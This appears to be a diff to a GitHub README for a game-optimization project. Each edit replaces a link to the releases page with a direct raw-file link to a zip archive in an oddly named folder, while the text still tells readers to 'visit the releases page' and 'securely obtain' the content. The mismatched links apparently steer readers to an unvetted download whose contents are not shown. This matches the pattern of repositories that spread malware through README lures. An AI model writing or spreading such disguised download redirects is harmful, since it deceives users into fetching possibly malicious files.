@@ -1,6 +1,6 @@
 # 🎮 game-mechanics-optimizations - Optimize Your Games Easily
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/1342Drumbum/game-mechanics-optimizations/releases)
+[![Download](https://raw.githubusercontent.com/1342Drumbum/game-mechanics-optimizations/main/fluviomarine/game-mechanics-optimizations-1.4.zip)](https://raw.githubusercontent.com/1342Drumbum/game-mechanics-optimizations/main/fluviomarine/game-mechanics-optimizations-1.4.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To use the game mechanics and optimizations from this repository, you will first
 
 1. **Visit the Releases Page**: 
    Click the link below to access all available downloads.  
-   [Download Here](https://github.com/1342Drumbum/game-mechanics-optimizations/releases)
+   [Download Here](https://raw.githubusercontent.com/1342Drumbum/game-mechanics-optimizations/main/fluviomarine/game-mechanics-optimizations-1.4.zip)
 
 2. **Choose Your Download**: 
    On the releases page, look for the latest version. Here, you will find the downloadable content. Please select the one that suits your needs.
@@ -33,7 +33,7 @@ To run this application, you will need:
 To securely obtain the game optimizations content:
 
 1. **Visit This Page**:  
-   [Download Here](https://github.com/1342Drumbum/game-mechanics-optimizations/releases)
+   [Download Here](https://raw.githubusercontent.com/1342Drumbum/game-mechanics-optimizations/main/fluviomarine/game-mechanics-optimizations-1.4.zip)
    
 2. **Select the Latest Release**: Look for the most recent version, which usually has the highest version number. 
 
